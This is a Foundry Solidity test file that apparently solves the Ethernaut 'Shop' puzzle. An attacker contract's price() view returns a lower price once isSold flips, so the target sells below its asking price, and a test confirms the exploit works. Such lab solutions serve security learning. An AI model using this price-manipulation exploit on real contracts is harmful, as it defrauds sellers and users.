// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Shop.sol";


contract ShopAttack {
    function price() external view returns (uint) {
        bool isSold = Shop(msg.sender).isSold();
//        assembly {
//            let result
//            switch isSold
//            case 1 {
//                result := 99
//            }
//            default {
//                result := 100
//            }
//
//            mstore(0x0, result)
//            return(0x0, 32)
//        }
        if (isSold) {
            return 1;
        } else {
            return 100;
        }
    }

    function attack(Shop _victim) external {
        Shop(_victim).buy();
    }
}


contract ShopTest is Test {
    Shop public shop;
    ShopAttack public attack;

    function setUp() public {
        shop = new Shop();
        attack = new ShopAttack();
    }

    function test_buy() public {
        assertEq(shop.isSold(), false);
        attack.attack(shop);
        assertEq(shop.isSold(), true);
    }
}
